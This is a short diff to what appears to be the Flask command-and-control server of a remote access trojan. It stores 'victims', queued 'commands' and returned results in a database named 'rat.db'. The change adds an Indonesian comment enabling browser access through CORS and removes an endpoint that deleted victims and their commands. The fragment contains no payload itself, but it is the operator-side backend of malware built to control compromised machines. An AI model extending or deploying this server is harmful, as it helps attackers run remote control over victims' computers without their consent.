@@ -5,7 +5,7 @@ from flask import Flask, request, jsonify
 from flask_cors import CORS
 
 app = Flask(__name__)
-CORS(app)
+CORS(app)  # ← ini izinin akses dari browser
 
 def init_db():
     conn = sqlite3.connect('rat.db')
@@ -78,17 +78,6 @@ def send_result():
     conn.commit()
     conn.close()
     return jsonify({'status': 'result_saved'})
-
-@app.route('/api/delete_victim', methods=['POST'])
-def delete_victim():
-    data = request.json
-    conn = sqlite3.connect('rat.db')
-    c = conn.cursor()
-    c.execute('DELETE FROM victims WHERE id = ?', (data['id'],))
-    c.execute('DELETE FROM commands WHERE victim_id = ?', (data['id'],))
-    conn.commit()
-    conn.close()
-    return jsonify({'status': 'deleted'})
 
 if __name__ == '__main__':
     init_db()
